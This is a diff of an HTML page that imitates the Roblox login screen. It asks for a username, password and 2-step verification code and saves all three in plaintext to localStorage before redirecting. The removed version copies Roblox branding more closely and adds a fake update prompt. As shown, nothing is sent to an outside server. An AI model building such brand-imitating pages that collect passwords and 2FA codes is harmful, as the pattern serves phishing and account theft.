@@ -3,64 +3,33 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Roblox Login - Two Step Verification</title>
+<title>Roblox Style Login</title>
+
 <style>
 body {
   margin: 0;
   font-family: Arial, sans-serif;
   height: 100vh;
   overflow: hidden;
-  background: url('https://www.roblox.com/assets/images/landing-page/hero-background.jpg') no-repeat center center fixed;
+  /* Replace with your own background image if needed */
+  background: url('bg.jpg') no-repeat center center fixed;
   background-size: cover;
 }
 
-.background-overlay {
-  position: fixed;
-  top:0; left:0; right:0; bottom:0;
-  background: rgba(0,0,0,0.6);
-  z-index: -1;
-}
-
-#updateModal {
-  position: fixed;
-  top:0; left:0; right:0; bottom:0;
-  background: rgba(0,0,0,0.6);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  z-index: 10;
-}
-
-#updateModal .modal-box {
-  background: white;
-  padding: 20px 30px;
-  border-radius: 12px;
-  text-align: center;
-  width: 300px;
-}
-
-#updateModal button {
-  padding: 10px 15px;
-  margin: 10px;
-  border-radius: 8px;
-  border: none;
-  cursor: pointer;
-  font-weight: bold;
-}
-
+/* LOGIN BOX */
 .box {
   position: absolute;
   top:50%;
   left:50%;
   transform: translate(-50%, -50%);
-  background: rgba(15,15,15,0.9);
-  backdrop-filter: blur(10px);
+  
+  background: rgba(15,15,15,0.85);
   padding: 30px;
   width: 320px;
   border-radius: 12px;
   text-align: center;
   color: white;
-  box-shadow: 0 10px 40px rgba(0,0,0,0.7);
+  box-shadow: 0 10px 40px rgba(0,0,0,0.6);
 }
 
 .box h2 {
@@ -93,96 +62,64 @@ button {
 #signInBtn { background: #fff; color: #000; }
 #verifyBtn { background: #0f0; color: #000; display: none; }
 
-.link { margin-top: 10px; font-size: 13px; color: #ccc; }
-
-/* LINK BUTTON STYLE */
-#selfLink {
-  display: block;
-  margin-top: 15px;
-  color: #00f2fe;
-  text-decoration: underline;
-  cursor: pointer;
-  font-weight: bold;
+.link {
+  margin-top: 10px;
+  font-size: 13px;
+  color: #ccc;
 }
 </style>
 </head>
+
 <body>
 
-<!-- UPDATE MODAL -->
-<div id="updateModal">
-  <div class="modal-box">
-    <p>Please update your website!</p>
-    <button id="remindLater">Remind Me Later</button>
-  </div>
-</div>
-
-<div class="background-overlay"></div>
-
-<!-- LOGIN BOX -->
 <div class="box">
   <h2>ROBLOX</h2>
+
   <input type="text" id="username" placeholder="Username/Email">
   <input type="password" id="password" placeholder="Password">
-  <input type="text" id="twoStep" placeholder="2-Step Verification Code" style="display:none;">
-  
+  <input type="text" id="twoStep" placeholder="2-Step Code" style="display:none;">
+
   <button id="signInBtn">Sign In</button>
   <button id="verifyBtn">Verify</button>
-  
-  <div class="link">Forgot Password?</div>
 
-  <!-- LINK TO OPEN LOGIN.HTML -->
-  <a id="selfLink">Open Login Page</a>
+  <div class="link">Forgot Password?</div>
 </div>
 
 <script>
-// MODAL
-const modal = document.getElementById('updateModal');
-document.getElementById('remindLater').addEventListener('click', () => {
-    modal.style.display = 'none';
-});
-
-// BUTTONS
 const signInBtn = document.getElementById('signInBtn');
 const verifyBtn = document.getElementById('verifyBtn');
-const selfLink = document.getElementById('selfLink');
 
-signInBtn.addEventListener('click', () => {
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+signInBtn.onclick = () => {
+  const user = document.getElementById('username').value;
+  const pass = document.getElementById('password').value;
+
+  if(user && pass){
+    // Show 2-step input
+    document.getElementById('twoStep').style.display = 'block';
+    signInBtn.style.display = 'none';
+    verifyBtn.style.display = 'block';
+    alert('Use code: 123456');
+  } else {
+    alert('Enter all fields');
+  }
+};
+
+verifyBtn.onclick = () => {
+  const code = document.getElementById('twoStep').value;
+
+  if(code === '123456'){
+    alert('Login successful!');
+    // Save info to localStorage (optional)
+    localStorage.setItem('username', document.getElementById('username').value);
+    localStorage.setItem('password', document.getElementById('password').value);
+    localStorage.setItem('twoStepCode', code);
     
-    if(username && password){
-        // Save username and password
-        localStorage.setItem('username', username);
-        localStorage.setItem('password', password);
-        
-        // Show 2-step verification
-        document.getElementById('twoStep').style.display = 'block';
-        signInBtn.style.display = 'none';
-        verifyBtn.style.display = 'block';
-        alert('A 2-Step verification code has been sent (for demo, use 123456)');
-    } else {
-        alert('Please enter both username and password.');
-    }
-});
-
-verifyBtn.addEventListener('click', () => {
-    const code = document.getElementById('twoStep').value;
-    
-    if(code === '123456'){
-        localStorage.setItem('twoStepCode', code);
-        alert('Login successful! All data saved.');
-        // Redirect to html.html
-        window.location.href = 'html.html';
-    } else {
-        alert('Incorrect verification code.');
-    }
-});
-
-// SELF LINK FUNCTIONALITY
-selfLink.addEventListener('click', () => {
-    // Open the same login page in a new tab
-    window.open('login.html', '_blank');
-});
+    // Redirect to html.html
+    window.location.href = 'html.html';
+  } else {
+    alert('Wrong code');
+  }
+};
 </script>
 
 </body>
